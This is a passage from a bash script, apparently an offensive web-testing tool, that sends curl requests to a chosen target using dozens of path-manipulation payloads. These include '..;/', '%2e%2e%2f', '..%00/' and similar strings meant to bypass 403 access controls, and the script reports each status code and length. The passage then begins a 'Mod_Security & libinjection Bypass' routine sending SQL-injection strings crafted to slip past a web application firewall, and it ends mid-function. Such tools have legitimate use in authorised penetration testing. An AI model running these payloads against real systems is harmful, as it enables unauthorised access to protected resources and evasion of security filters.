	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ../%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ .././ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.././" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}.././' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%00/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%00/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%00/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%0d/ ]"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%0d/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%0d/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%5c ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%5c" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%5c' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..\ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..\\" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..\\\\\\\\\\\\\\\' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..%ff/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%ff" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..%%%%ff' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2e%2e%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e%2e%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2e%%%%2e%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ .%2e/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}.%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %3f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%3f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %26 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%26" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%26' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %23 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%23' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %2e ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/.' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ? ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}?" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}?' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ?? ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}??" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}??' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ??? ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}???" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}???' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ // ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /./ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/./" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/./' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ .//./ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.//./" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}.//./' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ //?anything ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//?anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}//?anything' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ # ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}#" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}#' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ / ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /.randomstring ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/.randomstring" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/.randomstring' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ .html ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.html" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}.html' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ %20/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%20/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}%%%%20/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload: [ %20${path}%20/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%20${path}%20/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%20${path}%%%%20/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ .json ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.json" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}.json' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ \..\.\ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}\..\.\\" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}\..\.\\\\\\\\\\\\\\\' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /* ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/*" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/*' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ./. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}./." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}./.' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /*/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/*/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/*/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [%2e/${path} ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2e/${path}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /%2e/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ //. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}//." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}//.' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ //// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}////" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}////' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;${path}/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/;${path}/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/;${path}/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
}
function SQLi_libinjection(){
	echo -e ${blue}"---------------------------------------"${end}
	echo -e ${cyan}"[+] Mod_Security & libinjection Bypass "${end}
	echo -e ${blue}"---------------------------------------"${end}
	
	echo -n "Payload [ ' or 1.e(\")=' ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/'%20or%201.e(%22)%3D'" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/'%%%%20or%%%%201.e(%%%%22)%%%%3D' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Payload [ 1.e(ascii ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(ascii" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/1.e(ascii' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Payload [ 1.e(substring( ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/1.e(substring(" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
